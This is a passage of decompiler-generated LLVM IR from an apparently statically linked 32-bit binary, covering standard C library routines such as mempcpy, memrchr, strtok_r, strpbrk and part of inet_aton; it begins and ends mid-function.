  %v5_8055aa4 = inttoptr i32 %v4_8055aa4 to i8*
  %v3_8055aa8 = add i32 %v4_8055a8e, -1
  %v4_8055aa8 = add i32 %v3_8055aa8, %tmp
  %v5_8055aa8 = inttoptr i32 %v4_8055aa8 to i8*
  %v7_8055aad = call i8* @_memcpy(i8* %v5_8055aa8, i8* %v5_8055aa4, i32 %tmp)
  store i1 false, i1* @df, align 1
  br label %dec_label_pc_8055ab0

dec_label_pc_8055ab0:                             ; preds = %dec_label_pc_8055a9e, %dec_label_pc_8055aa4
  %v2_8055ab0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8055ab0, i32* @esi, align 4
  ret i32 %v4_8055a8e

; uselistorder directives
  uselistorder i8* %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 1, 3, 2, 0 }
  uselistorder i8* %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055ab0, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055ab4 = load i32, i32* @esi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_8055ac7 = inttoptr i32 %arg1 to i16*
  %v4_8055ac7 = call i32 @memcpy(i16* %v3_8055ac7, i32 %arg2, i32 %arg3)
  %v0_8055acc = load i32, i32* @esi, align 4
  %v2_8055acc = add i32 %v0_8055acc, %arg3
  store i32 %v0_8055ab4, i32* @esi, align 4
  ret i32 %v2_8055acc
}

define i32 @memrchr(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg2 to i8
  %v4_8055add = urem i32 %arg2, 256
  %v4_8055ae9 = sext i8 %arg1 to i32
  %v2_8055aed = add i32 %v4_8055ae9, %arg3
  %v1_8055aff6 = icmp eq i32 %arg3, 0
  br i1 %v1_8055aff6, label %dec_label_pc_8055b07, label %dec_label_pc_8055b03

dec_label_pc_8055af1:                             ; preds = %dec_label_pc_8055b03
  %v1_8055af1 = add i32 %v0_8055af1, -1
  %v5_8055af2 = load i32, i32* @edx, align 4
  %v6_8055af2 = and i32 %v5_8055af2, -256
  %v7_8055af2 = or i32 %v6_8055af2, %v4_8055add
  store i32 %v7_8055af2, i32* @edx, align 4
  %v1_8055af6 = inttoptr i32 %v1_8055af1 to i8*
  %v2_8055af6 = load i8, i8* %v1_8055af6, align 1
  %v15_8055af6 = icmp eq i8 %v2_8055af6, %tmp
  br i1 %v15_8055af6, label %dec_label_pc_8055b84, label %dec_label_pc_8055afe

dec_label_pc_8055afe:                             ; preds = %dec_label_pc_8055af1
  %v1_8055afe = add i32 %v0_8055afe, -1
  %v8_8055afe = icmp eq i32 %v1_8055afe, 0
  br i1 %v8_8055afe, label %dec_label_pc_8055b07, label %dec_label_pc_8055b03

dec_label_pc_8055b03:                             ; preds = %entry, %dec_label_pc_8055afe
  %v0_8055afe = phi i32 [ %v1_8055afe, %dec_label_pc_8055afe ], [ %arg3, %entry ]
  %v0_8055af1 = phi i32 [ %v1_8055af1, %dec_label_pc_8055afe ], [ %v2_8055aed, %entry ]
  %v2_8055b03 = urem i32 %v0_8055af1, 4
  %v3_8055b03 = icmp eq i32 %v2_8055b03, 0
  %v1_8055b05 = icmp eq i1 %v3_8055b03, false
  br i1 %v1_8055b05, label %dec_label_pc_8055af1, label %dec_label_pc_8055b07

dec_label_pc_8055b07:                             ; preds = %dec_label_pc_8055afe, %dec_label_pc_8055b03, %entry
  %v0_8055b6a.pr = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8055afe ], [ %v0_8055afe, %dec_label_pc_8055b03 ]
  %v0_8055b0c = phi i32 [ %v2_8055aed, %entry ], [ %v1_8055af1, %dec_label_pc_8055afe ], [ %v0_8055af1, %dec_label_pc_8055b03 ]
  store i32 %v0_8055b0c, i32* @ecx, align 4
  %v2_8055b10 = mul nuw nsw i32 %v4_8055add, 256
  %v2_8055b13 = or i32 %v2_8055b10, %v4_8055add
  %v2_8055b17 = mul i32 %v2_8055b13, 65536
  %v2_8055b1a = or i32 %v2_8055b17, %v2_8055b13
  %v6_8055b6d49 = icmp ugt i32 %v0_8055b6a.pr, 3
  br i1 %v6_8055b6d49, label %dec_label_pc_8055b1e, label %dec_label_pc_8055b6f

dec_label_pc_8055b1e:                             ; preds = %dec_label_pc_8055b07, %dec_label_pc_8055b67
  %v0_8055b6751 = phi i32 [ %v1_8055b67, %dec_label_pc_8055b67 ], [ %v0_8055b6a.pr, %dec_label_pc_8055b07 ]
  %v0_8055b1e50 = phi i32 [ %v1_8055b1e, %dec_label_pc_8055b67 ], [ %v0_8055b0c, %dec_label_pc_8055b07 ]
  %v1_8055b1e = add i32 %v0_8055b1e50, -4
  store i32 %v1_8055b1e, i32* @ecx, align 4
  %v2_8055b23 = inttoptr i32 %v1_8055b1e to i32*
  %v3_8055b23 = load i32, i32* %v2_8055b23, align 4
  %v4_8055b23 = xor i32 %v3_8055b23, %v2_8055b1a
  %v1_8055b25 = add i32 %v4_8055b23, 2130640639
  %v1_8055b2b = sub i32 -1, %v4_8055b23
  %v2_8055b2d = xor i32 %v1_8055b25, %v1_8055b2b
  %v1_8055b2f = and i32 %v2_8055b2d, -2130640640
  %v2_8055b2f = icmp eq i32 %v1_8055b2f, 0
  br i1 %v2_8055b2f, label %dec_label_pc_8055b67, label %dec_label_pc_8055b37

dec_label_pc_8055b37:                             ; preds = %dec_label_pc_8055b1e
  %v7_8055b37 = or i32 %v1_8055b2f, %v4_8055add
  %v1_8055b3b = add i32 %v0_8055b1e50, -1
  %v2_8055b3e = inttoptr i32 %v1_8055b3b to i8*
  %v3_8055b3e = load i8, i8* %v2_8055b3e, align 1
  %v16_8055b3e = icmp eq i8 %v3_8055b3e, %tmp
  br i1 %v16_8055b3e, label %dec_label_pc_8055b84, label %dec_label_pc_8055b43

dec_label_pc_8055b43:                             ; preds = %dec_label_pc_8055b37
  %v1_8055b47 = add i32 %v0_8055b1e50, -2
  %v2_8055b4a = inttoptr i32 %v1_8055b47 to i8*
  %v3_8055b4a = load i8, i8* %v2_8055b4a, align 1
  %v16_8055b4a = icmp eq i8 %v3_8055b4a, %tmp
  br i1 %v16_8055b4a, label %dec_label_pc_8055b84, label %dec_label_pc_8055b4f

dec_label_pc_8055b4f:                             ; preds = %dec_label_pc_8055b43
  %v1_8055b53 = add i32 %v0_8055b1e50, -3
  %v2_8055b56 = inttoptr i32 %v1_8055b53 to i8*
  %v3_8055b56 = load i8, i8* %v2_8055b56, align 1
  %v16_8055b56 = icmp eq i8 %v3_8055b56, %tmp
  br i1 %v16_8055b56, label %dec_label_pc_8055b84, label %dec_label_pc_8055b5b

dec_label_pc_8055b5b:                             ; preds = %dec_label_pc_8055b4f
  %v1_8055b5f = inttoptr i32 %v1_8055b1e to i8*
  %v2_8055b5f = load i8, i8* %v1_8055b5f, align 1
  %v15_8055b5f = icmp eq i8 %v2_8055b5f, %tmp
  %v1_8055b61 = icmp eq i1 %v15_8055b5f, false
  br i1 %v1_8055b61, label %dec_label_pc_8055b67, label %dec_label_pc_8055b63

dec_label_pc_8055b63:                             ; preds = %dec_label_pc_8055b5b
  br label %dec_label_pc_8055b84

dec_label_pc_8055b67:                             ; preds = %dec_label_pc_8055b5b, %dec_label_pc_8055b1e
  %v5_8055b7426 = phi i32 [ %v7_8055b37, %dec_label_pc_8055b5b ], [ 0, %dec_label_pc_8055b1e ]
  %v1_8055b67 = add i32 %v0_8055b6751, -4
  %v6_8055b6d = icmp ugt i32 %v1_8055b67, 3
  br i1 %v6_8055b6d, label %dec_label_pc_8055b1e, label %dec_label_pc_8055b6f

dec_label_pc_8055b6f:                             ; preds = %dec_label_pc_8055b67, %dec_label_pc_8055b07
  %v5_8055b7425.lcssa = phi i32 [ %v4_8055add, %dec_label_pc_8055b07 ], [ %v5_8055b7426, %dec_label_pc_8055b67 ]
  %v0_8055b1e.lcssa = phi i32 [ %v0_8055b0c, %dec_label_pc_8055b07 ], [ %v1_8055b1e, %dec_label_pc_8055b67 ]
  %v0_8055b67.lcssa = phi i32 [ %v0_8055b6a.pr, %dec_label_pc_8055b07 ], [ %v1_8055b67, %dec_label_pc_8055b67 ]
  br label %dec_label_pc_8055b7c

dec_label_pc_8055b73:                             ; preds = %dec_label_pc_8055b7c
  %v1_8055b7c = add i32 %v0_8055b7c, -1
  %v1_8055b73 = add i32 %v0_8055b73, -1
  %v6_8055b74 = and i32 %v5_8055b74, -256
  %v7_8055b74 = or i32 %v6_8055b74, %v4_8055add
  %v1_8055b78 = inttoptr i32 %v1_8055b73 to i8*
  %v2_8055b78 = load i8, i8* %v1_8055b78, align 1
  %v15_8055b78 = icmp eq i8 %v2_8055b78, %tmp
  br i1 %v15_8055b78, label %dec_label_pc_8055b84, label %dec_label_pc_8055b7c

dec_label_pc_8055b7c:                             ; preds = %dec_label_pc_8055b73, %dec_label_pc_8055b6f
  %v5_8055b74 = phi i32 [ %v7_8055b74, %dec_label_pc_8055b73 ], [ %v5_8055b7425.lcssa, %dec_label_pc_8055b6f ]
  %v0_8055b73 = phi i32 [ %v1_8055b73, %dec_label_pc_8055b73 ], [ %v0_8055b1e.lcssa, %dec_label_pc_8055b6f ]
  %v0_8055b7c = phi i32 [ %v1_8055b7c, %dec_label_pc_8055b73 ], [ %v0_8055b67.lcssa, %dec_label_pc_8055b6f ]
  %v10_8055b7d = icmp eq i32 %v0_8055b7c, 0
  %v1_8055b80 = icmp eq i1 %v10_8055b7d, false
  br i1 %v1_8055b80, label %dec_label_pc_8055b73, label %dec_label_pc_8055b82

dec_label_pc_8055b82:                             ; preds = %dec_label_pc_8055b7c
  br label %dec_label_pc_8055b84

dec_label_pc_8055b84:                             ; preds = %dec_label_pc_8055af1, %dec_label_pc_8055b4f, %dec_label_pc_8055b43, %dec_label_pc_8055b37, %dec_label_pc_8055b73, %dec_label_pc_8055b63, %dec_label_pc_8055b82
  %v0_8055b87 = phi i32 [ %v1_8055b1e, %dec_label_pc_8055b63 ], [ 0, %dec_label_pc_8055b82 ], [ %v1_8055b73, %dec_label_pc_8055b73 ], [ %v1_8055b53, %dec_label_pc_8055b4f ], [ %v1_8055b47, %dec_label_pc_8055b43 ], [ %v1_8055b3b, %dec_label_pc_8055b37 ], [ %v1_8055af1, %dec_label_pc_8055af1 ]
  ret i32 %v0_8055b87

; uselistorder directives
  uselistorder i32 %v0_8055b7c, { 1, 0 }
  uselistorder i32 %v1_8055b67, { 0, 2, 1 }
  uselistorder i32 %v1_8055b1e, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_8055b1e50, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8055b13, { 1, 0 }
  uselistorder i32 %v0_8055af1, { 1, 0, 2 }
  uselistorder i32 %v2_8055aed, { 1, 0 }
  uselistorder i32 %v4_8055add, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055b84, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055b1e, { 1, 0 }
  uselistorder label %dec_label_pc_8055b07, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055b03, { 1, 0 }
}

define i32 @strtok_r(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055b88 = load i32, i32* @edi, align 4
  %v0_8055b89 = load i32, i32* @esi, align 4
  %v0_8055b8a = load i32, i32* @ebx, align 4
  store i32 %v0_8055b8a, i32* %stack_var_-12, align 4
  %v4_8055b8b = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055b8b, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8055b97 = icmp eq i8* %arg1, null
  %v1_8055b99 = icmp eq i1 %v1_8055b97, false
  br i1 %v1_8055b99, label %dec_label_pc_8055b9d, label %dec_label_pc_8055b9b

dec_label_pc_8055b9b:                             ; preds = %entry
  %v1_8055b9b = inttoptr i32 %arg3 to i32*
  %v2_8055b9b = load i32, i32* %v1_8055b9b, align 4
  store i32 %v2_8055b9b, i32* @ebx, align 4
  br label %dec_label_pc_8055b9d

dec_label_pc_8055b9d:                             ; preds = %entry, %dec_label_pc_8055b9b
  %v0_8055ba0 = phi i32 [ %v4_8055b8b, %entry ], [ %v2_8055b9b, %dec_label_pc_8055b9b ]
  %v0_8055b9d = load i32, i32* @ecx, align 4
  %v5_8055ba0 = inttoptr i32 %v0_8055ba0 to i8*
  %v8_8055ba1 = call i32 @__GI_strspn(i8* %v5_8055ba0, i32 %arg2, i32 %v0_8055b9d, i32 %v0_8055b9d)
  store i32 %v8_8055ba1, i32* %eax.global-to-local, align 4
  %v0_8055ba9 = load i32, i32* @ebx, align 4
  %v2_8055ba9 = add i32 %v0_8055ba9, %v8_8055ba1
  store i32 %v2_8055ba9, i32* @ebx, align 4
  %v1_8055bab = inttoptr i32 %v2_8055ba9 to i8*
  %v2_8055bab = load i8, i8* %v1_8055bab, align 1
  %v3_8055bab = icmp eq i8 %v2_8055bab, 0
  %v1_8055bae = icmp eq i1 %v3_8055bab, false
  br i1 %v1_8055bae, label %dec_label_pc_8055bb6, label %dec_label_pc_8055bb0

dec_label_pc_8055bb0:                             ; preds = %dec_label_pc_8055b9d
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8055bb2 = load i32, i32* @esi, align 4
  %v2_8055bb2 = inttoptr i32 %v1_8055bb2 to i32*
  store i32 %v2_8055ba9, i32* %v2_8055bb2, align 4
  %v0_8055be0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055bdd

dec_label_pc_8055bb6:                             ; preds = %dec_label_pc_8055b9d
  %v0_8055bb6 = load i32, i32* @edx, align 4
  %v0_8055bb8 = load i32, i32* @edi, align 4
  %v8_8055bba = call i32 @__GI_strpbrk(i8* %v1_8055bab, i32 %v0_8055bb8, i32 %v0_8055bb6, i32 %v0_8055bb6)
  store i32 %v8_8055bba, i32* %eax.global-to-local, align 4
  %v2_8055bc2 = icmp eq i32 %v8_8055bba, 0
  %v1_8055bc4 = icmp eq i1 %v2_8055bc2, false
  br i1 %v1_8055bc4, label %dec_label_pc_8055bd5, label %dec_label_pc_8055bc6

dec_label_pc_8055bc6:                             ; preds = %dec_label_pc_8055bb6
  %v0_8055bca = load i32, i32* @ebx, align 4
  %v5_8055bca = inttoptr i32 %v0_8055bca to i8*
  %v8_8055bcb = call i32 @rawmemchr(i8* %v5_8055bca, i32 0, i32 %v8_8055bba, i32 %v8_8055bba)
  br label %dec_label_pc_8055bd9

dec_label_pc_8055bd5:                             ; preds = %dec_label_pc_8055bb6
  %v9_8055bba = inttoptr i32 %v8_8055bba to i8*
  store i8 0, i8* %v9_8055bba, align 1
  %v2_8055bd8 = add i32 %v8_8055bba, 1
  br label %dec_label_pc_8055bd9

dec_label_pc_8055bd9:                             ; preds = %dec_label_pc_8055bc6, %dec_label_pc_8055bd5
  %storemerge = phi i32 [ %v2_8055bd8, %dec_label_pc_8055bd5 ], [ %v8_8055bcb, %dec_label_pc_8055bc6 ]
  %v0_8055bd9 = phi i32 [ %v2_8055bd8, %dec_label_pc_8055bd5 ], [ %v8_8055bcb, %dec_label_pc_8055bc6 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055bd9 = load i32, i32* @esi, align 4
  %v2_8055bd9 = inttoptr i32 %v1_8055bd9 to i32*
  store i32 %v0_8055bd9, i32* %v2_8055bd9, align 4
  %v0_8055bdb = load i32, i32* @ebx, align 4
  store i32 %v0_8055bdb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055bdd

dec_label_pc_8055bdd:                             ; preds = %dec_label_pc_8055bb0, %dec_label_pc_8055bd9
  %v0_8055be0 = phi i32 [ %v0_8055be0.pre, %dec_label_pc_8055bb0 ], [ %v0_8055bdb, %dec_label_pc_8055bd9 ]
  %v2_8055bdd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055bdd, i32* @ebx, align 4
  store i32 %v0_8055b89, i32* @esi, align 4
  store i32 %v0_8055b88, i32* @edi, align 4
  ret i32 %v0_8055be0

; uselistorder directives
  uselistorder i32 %v8_8055bba, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055bdd, { 1, 0 }
  uselistorder label %dec_label_pc_8055bd9, { 1, 0 }
  uselistorder label %dec_label_pc_8055b9d, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8055be5 = load i32, i32* @ebx, align 4
  %v2_8055bfc24 = load i8, i8* %arg1, align 1
  %v4_8055bfe28 = icmp eq i8 %v2_8055bfc24, 0
  br i1 %v4_8055bfe28, label %dec_label_pc_8055c06, label %dec_label_pc_8055c02.lr.ph

dec_label_pc_8055c02.lr.ph:                       ; preds = %entry
  %v3_8055bfc25 = zext i8 %v2_8055bfc24 to i32
  %v5_8055bfc26 = and i32 %v0_8055be5, -256
  %v6_8055bfc27 = or i32 %v3_8055bfc25, %v5_8055bfc26
  %v4_8055bea = ptrtoint i8* %arg1 to i32
  %v1_8055bf513 = inttoptr i32 %arg2 to i8*
  %v4_8055bf5.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8055c02

dec_label_pc_8055bf0:                             ; preds = %dec_label_pc_8055c02, %dec_label_pc_8055bf4
  %v6_8055bf522 = phi i32 [ %v6_8055bf5, %dec_label_pc_8055bf4 ], [ %v6_8055bf517, %dec_label_pc_8055c02 ]
  %v2_8055bf521 = phi i8 [ %v2_8055bf5, %dec_label_pc_8055bf4 ], [ %v2_8055bf514, %dec_label_pc_8055c02 ]
  %v0_8055bf420 = phi i32 [ %v1_8055bf4, %dec_label_pc_8055bf4 ], [ %arg2, %dec_label_pc_8055c02 ]
  %v15_8055bf0 = icmp eq i8 %v2_8055bf521, %v2_8055bfc31
  br i1 %v15_8055bf0, label %dec_label_pc_8055c08, label %dec_label_pc_8055bf4

dec_label_pc_8055bf4:                             ; preds = %dec_label_pc_8055bf0
  %v1_8055bf4 = add i32 %v0_8055bf420, 1
  store i32 %v1_8055bf4, i32* @edx, align 4
  %v1_8055bf5 = inttoptr i32 %v1_8055bf4 to i8*
  %v2_8055bf5 = load i8, i8* %v1_8055bf5, align 1
  %v3_8055bf5 = zext i8 %v2_8055bf5 to i32
  %v5_8055bf5 = and i32 %v6_8055bf522, -256
  %v6_8055bf5 = or i32 %v3_8055bf5, %v5_8055bf5
  store i32 %v6_8055bf5, i32* @ecx, align 4
  %v4_8055bf7 = icmp eq i8 %v2_8055bf5, 0
  %v1_8055bf9 = icmp eq i1 %v4_8055bf7, false
  br i1 %v1_8055bf9, label %dec_label_pc_8055bf0, label %dec_label_pc_8055bfb

dec_label_pc_8055bfb:                             ; preds = %dec_label_pc_8055bf4, %dec_label_pc_8055c02
  %v4_8055bf5.pre34 = phi i32 [ %v6_8055bf517, %dec_label_pc_8055c02 ], [ %v6_8055bf5, %dec_label_pc_8055bf4 ]
  %v1_8055bfb = add i32 %v0_8055bfb29, 1
  %v1_8055bfc = inttoptr i32 %v1_8055bfb to i8*
  %v2_8055bfc = load i8, i8* %v1_8055bfc, align 1
  %v3_8055bfc = zext i8 %v2_8055bfc to i32
  %v5_8055bfc = and i32 %v6_8055bfc32, -256
  %v6_8055bfc = or i32 %v3_8055bfc, %v5_8055bfc
  %v4_8055bfe = icmp eq i8 %v2_8055bfc, 0
  br i1 %v4_8055bfe, label %dec_label_pc_8055c06, label %dec_label_pc_8055c02

dec_label_pc_8055c02:                             ; preds = %dec_label_pc_8055c02.lr.ph, %dec_label_pc_8055bfb
  %v4_8055bf5.pre = phi i32 [ %v4_8055bf5.pre.pre, %dec_label_pc_8055c02.lr.ph ], [ %v4_8055bf5.pre34, %dec_label_pc_8055bfb ]
  %v6_8055bfc32 = phi i32 [ %v6_8055bfc27, %dec_label_pc_8055c02.lr.ph ], [ %v6_8055bfc, %dec_label_pc_8055bfb ]
  %v2_8055bfc31 = phi i8 [ %v2_8055bfc24, %dec_label_pc_8055c02.lr.ph ], [ %v2_8055bfc, %dec_label_pc_8055bfb ]
  %v0_8055bfb29 = phi i32 [ %v4_8055bea, %dec_label_pc_8055c02.lr.ph ], [ %v1_8055bfb, %dec_label_pc_8055bfb ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8055bf514 = load i8, i8* %v1_8055bf513, align 1
  %v3_8055bf515 = zext i8 %v2_8055bf514 to i32
  %v5_8055bf516 = and i32 %v4_8055bf5.pre, -256
  %v6_8055bf517 = or i32 %v3_8055bf515, %v5_8055bf516
  store i32 %v6_8055bf517, i32* @ecx, align 4
  %v4_8055bf718 = icmp eq i8 %v2_8055bf514, 0
  %v1_8055bf919 = icmp eq i1 %v4_8055bf718, false
  br i1 %v1_8055bf919, label %dec_label_pc_8055bf0, label %dec_label_pc_8055bfb

dec_label_pc_8055c06:                             ; preds = %dec_label_pc_8055bfb, %entry
  br label %dec_label_pc_8055c08

dec_label_pc_8055c08:                             ; preds = %dec_label_pc_8055bf0, %dec_label_pc_8055c06
  %v0_8055c0a = phi i32 [ 0, %dec_label_pc_8055c06 ], [ %v0_8055bfb29, %dec_label_pc_8055bf0 ]
  store i32 %v0_8055be5, i32* @ebx, align 4
  ret i32 %v0_8055c0a

; uselistorder directives
  uselistorder i32 %v6_8055bf517, { 2, 0, 1 }
  uselistorder i8 %v2_8055bf514, { 1, 2, 0 }
  uselistorder i32 %v1_8055bfb, { 1, 0 }
  uselistorder i32 %v6_8055bf5, { 1, 2, 0 }
  uselistorder i8 %v2_8055bf5, { 1, 2, 0 }
  uselistorder i32 %v1_8055bf4, { 2, 1, 0 }
  uselistorder i8 %v2_8055bfc24, { 0, 2, 1 }
  uselistorder i32 %v0_8055be5, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055c08, { 1, 0 }
  uselistorder label %dec_label_pc_8055c02, { 1, 0 }
  uselistorder label %dec_label_pc_8055bfb, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8055c13 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055c13, i32* @ecx, align 4
  %v1_8055c17 = icmp eq i8* %arg1, null
  br i1 %v1_8055c17, label %dec_label_pc_8055c98, label %dec_label_pc_8055c1b

dec_label_pc_8055c1b:                             ; preds = %entry
  %v0_8055c29.pre = load i32, i32* @global_var_805d1e8, align 8
  br label %dec_label_pc_8055c26

dec_label_pc_8055c26:                             ; preds = %dec_label_pc_8055c1b, %dec_label_pc_8055c6f
  %v2_8055c7235 = phi i32 [ 1, %dec_label_pc_8055c1b ], [ %v3_8055c72, %dec_label_pc_8055c6f ]
  %v0_8055c2634 = phi i32 [ %v4_8055c13, %dec_label_pc_8055c1b ], [ %v0_8055c263, %dec_label_pc_8055c6f ]
  %v0_8055c8d33 = phi i32 [ 0, %dec_label_pc_8055c1b ], [ %v2_8055c75, %dec_label_pc_8055c6f ]
  %v1_8055c26 = inttoptr i32 %v0_8055c2634 to i8*
  %v2_8055c26 = load i8, i8* %v1_8055c26, align 1
  %v3_8055c26 = sext i8 %v2_8055c26 to i32
  %v2_8055c2f = mul nsw i32 %v3_8055c26, 2
  %v3_8055c2f = add i32 %v2_8055c2f, %v0_8055c29.pre
  %v4_8055c2f = inttoptr i32 %v3_8055c2f to i8*
  %v5_8055c2f = load i8, i8* %v4_8055c2f, align 1
  %v6_8055c2f = and i8 %v5_8055c2f, 8
  %v7_8055c2f = icmp eq i8 %v6_8055c2f, 0
  br i1 %v7_8055c2f, label %dec_label_pc_8055c98, label %dec_label_pc_8055c36

dec_label_pc_8055c36:                             ; preds = %dec_label_pc_8055c26
  %v4_8055c4a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8055c4a

dec_label_pc_8055c3a:                             ; preds = %dec_label_pc_8055c4a
  %v3_8055c3a = mul i32 %v1_8055c3a, 10
  %v2_8055c3d = add i32 %v3_8055c3a, -48
  %v3_8055c3d = add i32 %v2_8055c3d, %v2_8055c4c
  %v1_8055c41 = add i32 %v3_8055c3d, -255
  %v6_8055c41 = sub i32 254, %v3_8055c3d
  %v7_8055c41 = and i32 %v6_8055c41, %v3_8055c3d
  %v8_8055c41 = icmp slt i32 %v7_8055c41, 0
  %v9_8055c41 = icmp eq i32 %v1_8055c41, 0
  %v10_8055c41 = icmp slt i32 %v1_8055c41, 0
  %v3_8055c47 = icmp eq i1 %v10_8055c41, %v8_8055c41
  %v4_8055c47 = icmp eq i1 %v9_8055c41, false
  %v5_8055c47 = and i1 %v4_8055c47, %v3_8055c47
  br i1 %v5_8055c47, label %dec_label_pc_8055c98, label %dec_label_pc_8055c49

dec_label_pc_8055c49:                             ; preds = %dec_label_pc_8055c3a
  %v1_8055c49 = add i32 %v0_8055c49, 1
  store i32 %v1_8055c49, i32* @ecx, align 4
  br label %dec_label_pc_8055c4a

dec_label_pc_8055c4a:                             ; preds = %dec_label_pc_8055c36, %dec_label_pc_8055c49
  %v1_8055c3a = phi i32 [ 0, %dec_label_pc_8055c36 ], [ %v3_8055c3d, %dec_label_pc_8055c49 ]
  %v4_8055c4a = phi i32 [ %v4_8055c4a.pre, %dec_label_pc_8055c36 ], [ %v6_8055c4a, %dec_label_pc_8055c49 ]
  %v0_8055c49 = phi i32 [ %v0_8055c2634, %dec_label_pc_8055c36 ], [ %v1_8055c49, %dec_label_pc_8055c49 ]
  %v1_8055c4a = inttoptr i32 %v0_8055c49 to i8*
  %v2_8055c4a = load i8, i8* %v1_8055c4a, align 1
  %v3_8055c4a = zext i8 %v2_8055c4a to i32
  %v5_8055c4a = and i32 %v4_8055c4a, -256
  %v6_8055c4a = or i32 %v3_8055c4a, %v5_8055c4a
  store i32 %v6_8055c4a, i32* @edx, align 4
  %v2_8055c4c = sext i8 %v2_8055c4a to i32
  %v2_8055c4f = mul nsw i32 %v2_8055c4c, 2
  %v3_8055c4f = add i32 %v2_8055c4f, %v0_8055c29.pre
  %v4_8055c4f = inttoptr i32 %v3_8055c4f to i16*
  %v5_8055c4f = load i16, i16* %v4_8055c4f, align 2
  %v2_8055c54 = and i16 %v5_8055c4f, 8
  %v3_8055c54 = icmp eq i16 %v2_8055c54, 0
  %v1_8055c56 = icmp eq i1 %v3_8055c54, false
  br i1 %v1_8055c56, label %dec_label_pc_8055c3a, label %dec_label_pc_8055c58

dec_label_pc_8055c58:                             ; preds = %dec_label_pc_8055c4a
  %v8_8055c58 = sub nsw i32 2, %v2_8055c7235
  %v9_8055c58 = and i32 %v8_8055c58, %v2_8055c7235
  %v10_8055c58 = icmp slt i32 %v9_8055c58, 0
  %v11_8055c58 = icmp eq i32 %v2_8055c7235, 3
  %v12_8055c58 = icmp slt i32 %v2_8055c7235, 3
  %v3_8055c5c = icmp eq i1 %v12_8055c58, %v10_8055c58
  %v4_8055c5c = icmp eq i1 %v11_8055c58, false
  %v5_8055c5c = and i1 %v4_8055c5c, %v3_8055c5c
  br i1 %v5_8055c5c, label %dec_label_pc_8055c66, label %dec_label_pc_8055c5e

dec_label_pc_8055c5e:                             ; preds = %dec_label_pc_8055c58
  %v10_8055c5e = icmp eq i8 %v2_8055c4a, 46
  %v1_8055c61 = icmp eq i1 %v10_8055c5e, false
  br i1 %v1_8055c61, label %dec_label_pc_8055c98, label %dec_label_pc_8055c63

dec_label_pc_8055c63:                             ; preds = %dec_label_pc_8055c5e
  %v1_8055c63 = add i32 %v0_8055c49, 1
  store i32 %v1_8055c63, i32* @ecx, align 4
  br label %dec_label_pc_8055c6f

dec_label_pc_8055c66:                             ; preds = %dec_label_pc_8055c58
  %v1_8055c66 = add i32 %v0_8055c49, 1
  store i32 %v1_8055c66, i32* @ecx, align 4
  %v4_8055c67 = icmp eq i8 %v2_8055c4a, 0
  br i1 %v4_8055c67, label %dec_label_pc_8055c6f, label %dec_label_pc_8055c6b

dec_label_pc_8055c6b:                             ; preds = %dec_label_pc_8055c66
  %v2_8055c6b = and i16 %v5_8055c4f, 32
  %v3_8055c6b = icmp eq i16 %v2_8055c6b, 0
  br i1 %v3_8055c6b, label %dec_label_pc_8055c98, label %dec_label_pc_8055c6f

dec_label_pc_8055c6f:                             ; preds = %dec_label_pc_8055c6b, %dec_label_pc_8055c66, %dec_label_pc_8055c63
  %v0_8055c263 = phi i32 [ %v1_8055c66, %dec_label_pc_8055c6b ], [ %v1_8055c66, %dec_label_pc_8055c66 ], [ %v1_8055c63, %dec_label_pc_8055c63 ]
  %v2_8055c6f = mul i32 %v0_8055c8d33, 256
  %v3_8055c72 = add nuw nsw i32 %v2_8055c7235, 1
  %v2_8055c75 = or i32 %v1_8055c3a, %v2_8055c6f
  %v7_8055c7b = icmp sgt i32 %v2_8055c7235, 3
  br i1 %v7_8055c7b, label %dec_label_pc_8055c7d, label %dec_label_pc_8055c26

dec_label_pc_8055c7d:                             ; preds = %dec_label_pc_8055c6f
  %v4_8055c82 = icmp eq i32 %arg2, 0
  br i1 %v4_8055c82, label %dec_label_pc_8055c9a, label %dec_label_pc_8055c89

dec_label_pc_8055c89:                             ; preds = %dec_label_pc_8055c7d
  %v1_8055c8d = call i32 @llvm.bswap.i32(i32 %v2_8055c75)
  %v2_8055c8f = inttoptr i32 %arg2 to i32*
